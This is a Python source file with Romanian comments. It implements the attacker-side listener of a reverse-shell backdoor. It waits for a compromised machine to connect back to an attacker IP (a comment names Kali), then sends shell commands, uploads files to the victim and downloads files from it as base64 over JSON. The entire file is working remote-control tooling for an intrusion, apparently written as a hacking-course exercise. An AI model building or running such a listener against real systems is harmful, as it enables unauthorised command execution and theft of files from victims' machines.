import socket 
import simplejson
import os
import struct
import base64
import optparse
import re


class Listener:
    
    def __init__(self, ip , port):
        
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        #schimbam optiunea.
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port)) # trebuie sa facem bind pe ip-ul nostru si in partea cealalta sa adaugam ip-ul tot de aici din kali
        listener.listen(0)
        print("Asteapta conexiune...")

        self.connection, address = listener.accept()
        print("Conexiune realizata de la {} ".format(str(address)))

    def reliable_send(self, data):
        json_data = simplejson.dumps(data) # convert in json
        self.connection.send(json_data.encode())

    def reliable_receive(self):
        json_data = ""
        while True:
            # facem infinit loop pana il luam pe tot  cand ajung in except trebuie sa continue
            try:
                json_data = json_data + str(self.connection.recv(1024).decode('utf-8'))
                return simplejson.loads(json_data)
            except ValueError:
                continue
        
    def execute_remotely(self, command):
        self.reliable_send(command)
        if command[0] == "exit": # in cazul in care se trimite exit sa inchid portul de comunicare
            self.connection.close()
            exit()
        
        return self.reliable_receive()

    def write_file(self,path,content):
        with open(path,"wb") as file:
            file.write(base64.b64decode(bytes(content, 'utf8',errors="ignore")))
            return "Descarcare cu succes!"

    def read_file(self, path):
        with open(path, "rb") as file:
            content = base64.b64encode(file.read()) 
            return content

    def run(self):
        while True:
            command = input(">> ")
            command = command.split(" ") # facem split cu spatii pentru a trimite mai multe comenzi

            try:
                if command[0] == "upload":
                    file_content = self.read_file(command[1])
                    command.append(file_content)

                result = self.execute_remotely(command)
                if command[0] == "download" and "Eroare " not in result:
                    result = self.write_file(command[1],result)            
            except Exception:
                result = "Eroare in executarea comenzii"

            print(result)

def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-i", "--ip", dest="ip", help="IP-ul soursa") # specificam prima optiune pe care o folosim
    parser.add_option("-p", "--port", dest="port", help="portul pentru care se face conexiunea")
    (option, arguments) = parser.parse_args()
    if not option.ip:
        parser.error("Specifica te rog un ip!. Foloseste --help pentru mai multe informatii")
    elif not option.port:
        parser.error("Specifica te rog un port. Foloseste --help pentru mai multe informatii")
    else:
        return option


option = get_arguments()
ip_ok = re.match(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$",option.ip)
if option is None or (not ip_ok):
    print("Adresa IP nu este valida!")
else:
    myListener = Listener(option.ip, int(option.port))
    myListener.run()